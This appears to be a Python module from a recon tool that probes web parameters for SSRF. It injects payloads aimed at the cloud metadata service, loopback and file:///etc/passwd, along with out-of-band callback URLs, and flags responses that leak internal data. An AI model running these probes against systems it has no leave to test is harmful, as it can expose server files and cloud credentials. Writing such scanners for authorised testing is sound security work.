from __future__ import annotations

import json
import uuid
import asyncio
import hashlib
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from recon_cli.pipeline.context import PipelineContext
from recon_cli.pipeline.stages.core.stage_base import Stage, note_missing_tool
from recon_cli.utils import time as time_utils
from recon_cli.utils.oast import InteractshSession
from recon_cli.utils.async_http import AsyncHTTPClient, HTTPClientConfig


class SSRFValidatorStage(Stage):
    name = "ssrf_validator"

    SSRF_PARAMS = {
        "url", "uri", "link", "host", "domain", "site", "callback", "dest", "next",
        "proxy", "redirect", "file", "path", "src", "source", "action"
    }
    
    # Adaptive Classification Payloads
    CLASSIFICATION_PAYLOADS = {
        "dns_only": "http://{token}.dns.ssrf.local/",
        "http_standard": "http://{token}.http.ssrf.local/",
        "https_standard": "https://{token}.https.ssrf.local/",
        "internal_metadata": "http://169.254.169.254/latest/meta-data/",
        "internal_loopback": "http://127.0.0.1:80/",
        "file_proto": "file:///etc/passwd",
        "redirect_chain": "http://{token}.redir.ssrf.local/redirect-to?url=http://169.254.169.254/",
    }

    INTERNAL_INDICATORS = (
        "127.0.0.1", "localhost", "169.254.169.254", "latest/meta-data",
        "instance-id", "ami-id", "computeMetadata", "root:x:0:0",
        "connection refused", "econnrefused", "metadata-flavor",
    )

    def is_enabled(self, context: PipelineContext) -> bool:
        return bool(getattr(context.runtime_config, "enable_ssrf_validator", True))

    async def run_async(self, context: PipelineContext) -> None:
        runtime = context.runtime_config
        max_urls = max(1, int(getattr(runtime, "ssrf_validator_max_urls", 25)))
        max_per_host = max(1, int(getattr(runtime, "ssrf_validator_max_per_host", 6)))
        min_score = int(getattr(runtime, "ssrf_validator_min_score", 40))
        timeout = max(1, int(getattr(runtime, "ssrf_validator_timeout", 10)))
        verify_tls = bool(getattr(runtime, "verify_tls", True))
        enable_oast = bool(getattr(runtime, "ssrf_validator_enable_oast", True))
        
        candidates = self._collect_candidates(context, min_score=min_score, max_urls=max_urls, max_per_host=max_per_host)
        if not candidates:
            context.update_stats(self.name, attempted=0, confirmed=0, candidates=0)
            return

        artifacts_dir = context.record.paths.ensure_subdir("ssrf_validator")
        
        client_config = HTTPClientConfig(
            max_concurrent=15,
            total_timeout=float(timeout),
            verify_ssl=verify_tls,
            requests_per_second=float(getattr(runtime, "ssrf_validator_rps", 20.0))
        )

        async with AsyncHTTPClient(client_config, context=context) as client:
            # Phase 1: Sink Classification Loop (Adaptive)
            for entry in candidates:
                url, param = str(entry["url"]), str(entry["param"])
                host = urlparse(url).hostname or "unknown"
                
                context.logger.info("Classifying SSRF sink at %s (param: %s)", url, param)
                
                # 1. Baseline Request
                b_url, b_method, b_data, b_json = self._prepare_payload_request(entry, "https://example.com/")
                b_status, b_body = await self._fetch_response(client, context, b_url, b_method, b_data, b_json)
                
                # 2. Adaptive Probing
                if enable_oast:
                    session = self._get_oast_session(context, artifacts_dir)
                    if session:
                        token = uuid.uuid4().hex[:8]
                        oast_url = session.make_url(token)
                        
                        test_url, method, data, json_body = self._prepare_payload_request(entry, oast_url)
                        status, body = await self._fetch_response(client, context, test_url, method, data, json_body)
                        
                        # Wait and collect
                        await asyncio.sleep(2) # Short wait for classification
                        interactions = session.collect_interactions([token])
                        
                        if interactions:
                            # Sink confirmed! Now classify behavior.
                            i_types = [i.protocol for i in interactions]
                            classification = "blind_full" if "http" in i_types else "blind_dns"
                            
                            context.update_stats(self.name, confirmed=1)
                            self._report_confirmed(context, entry, classification, interactions[0].raw, evidence_source="oast")
                            
                            # Add to Target Graph (Phase 2 integration)
                            context.target_graph.add_entity("ssrf_sink", f"{url}:{param}", 
                                                           host=host, classification=classification, 
                                                           confirmed=True)
                            continue

                # 3. Content-Based Internal Probing
                for p_name, p_template in self.CLASSIFICATION_PAYLOADS.items():
                    if "local" in p_template: continue # Skip OAST ones in this loop
                    
                    test_url, method, data, json_body = self._prepare_payload_request(entry, p_template)
                    status, body = await self._fetch_response(client, context, test_url, method, data, json_body)
                    
                    if self._looks_internal(body, baseline_body=b_body, status=status, baseline_status=b_status):
                        classification = f"internal_{p_name}"
                        context.update_stats(self.name, confirmed=1)
                        self._report_confirmed(context, entry, classification, body[:1000], evidence_source="differential")
                        
                        context.target_graph.add_entity("ssrf_sink", f"{url}:{param}", 
                                                       host=host, classification=classification, 
                                                       confirmed=True)
                        break

        # Finalize
        artifact_path = artifacts_dir / "ssrf_validator.json"
        # We'll save a simpler artifact for now or could collect probes if needed
        artifact_path.write_text(json.dumps({
            "timestamp": time_utils.iso_now(),
            "candidates": len(candidates),
        }, indent=2, sort_keys=True), encoding="utf-8")
        
        context.update_stats(self.name, artifact=str(artifact_path.relative_to(context.record.paths.root)))
        context.manager.update_metadata(context.record)

    def _get_oast_session(self, context: PipelineContext, artifacts_dir: Path) -> Optional[InteractshSession]:
        if not hasattr(self, "_oast_session"):
            output_path = artifacts_dir / "interactsh.json"
            session = InteractshSession(output_path, logger=context.logger)
            if session.start():
                self._oast_session = session
            else:
                return None
        return self._oast_session

    def _report_confirmed(self, context: PipelineContext, entry: Dict[str, Any], 
                          classification: str, proof: Any, evidence_source: str) -> None:
        url = entry["url"]
        param = entry["param"]
        
        tags = ["ssrf", "confirmed", classification, evidence_source]
        if evidence_source == "oast": tags.append("oast")
        if evidence_source == "differential": tags.append("internal")
        
        signal_id = context.emit_signal(
            "ssrf_confirmed", "url", url, 
            confidence=1.0 if evidence_source == "oast" else 0.85,
            source=self.name, 
            tags=tags,
            evidence={"param": param, "proof": str(proof)[:500], "source": evidence_source}
        )
        
        finding = {
            "type": "finding", "finding_type": "ssrf", "source": self.name, 
            "url": url, "hostname": urlparse(url).hostname,
            "description": f"Confirmed SSRF via {evidence_source} ({classification})",
            "details": {"parameter": param, "classification": classification, "evidence_source": evidence_source},
            "proof": str(proof)[:1000], "tags": tags, 
            "score": 90 if evidence_source == "oast" else 85,
            "severity": "high", "evidence_id": signal_id or None,
        }
        context.results.append(finding)

    async def _fetch_response(self, client: AsyncHTTPClient, context: PipelineContext, url: str, method: str, data: Any, json_body: Any) -> Tuple[int, str]:
        headers = context.auth_headers({"User-Agent": "recon-cli ssrf-validator"})
        try:
            resp = await client._request(method=method, url=url, headers=headers, data=data, json=json_body)
            return resp.status, resp.body
        except Exception:
            return 0, ""

    def _collect_candidates(self, context: PipelineContext, *, min_score: int, max_urls: int, max_per_host: int) -> List[Dict[str, Any]]:
        grouped = defaultdict(list)
        seen = set()
        for entry in context.iter_results():
            url = str(entry.get("url") or "").strip()
            if not url: continue
            host = urlparse(url).hostname or ""
            score = int(entry.get("score", 0) or 0)
            if score < min_score: continue
            
            method = str(entry.get("method") or "get").lower()
            params = parse_qsl(urlparse(url).query, keep_blank_values=True)
            for key, _ in params:
                name = str(key).strip().lower()
                if name in self.SSRF_PARAMS and (url, name) not in seen:
                    seen.add((url, name))
                    grouped[host].append({"url": url, "param": name, "method": method, "score": score})
            
            if entry.get("finding_type") == "ssrf":
                pname = str(entry.get("parameter") or "url").lower()
                if pname in self.SSRF_PARAMS and (url, pname) not in seen:
                    seen.add((url, pname))
                    grouped[host].append({"url": url, "param": pname, "method": method, "score": max(score, 80)})

        selected = []
        for items in grouped.values():
            items.sort(key=lambda x: x["score"], reverse=True)
            selected.extend(items[:max_per_host])
        selected.sort(key=lambda x: x["score"], reverse=True)
        return selected[:max_urls]

    def _prepare_payload_request(self, entry: Dict[str, Any], payload: str) -> Tuple[str, str, Any, Any]:
        url, param, method = str(entry["url"]), str(entry["param"]), str(entry["method"])
        if method == "get":
            parsed = urlparse(url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            updated = []
            replaced = False
            for k, v in pairs:
                if k == param and not replaced: updated.append((k, payload)); replaced = True
                else: updated.append((k, v))
            if not replaced: updated.append((param, payload))
            return urlunparse(parsed._replace(query=urlencode(updated, doseq=True))), "get", None, None
        return url, method, {param: payload}, None

    def _looks_internal(self, body: str, *, baseline_body: str, status: int, baseline_status: int) -> bool:
        if not body: return False
        lowered = body.lower()
        
        # 1. Direct indicators
        if any(indicator in lowered for indicator in self.INTERNAL_INDICATORS):
            return True
            
        # 2. Significant differential from baseline
        if status != baseline_status and status == 200:
            # If baseline was 404/403 and this is 200 with internal-looking content
            if len(body) != len(baseline_body) and ("html" not in lowered or "title" not in lowered):
                return True
                
        return False
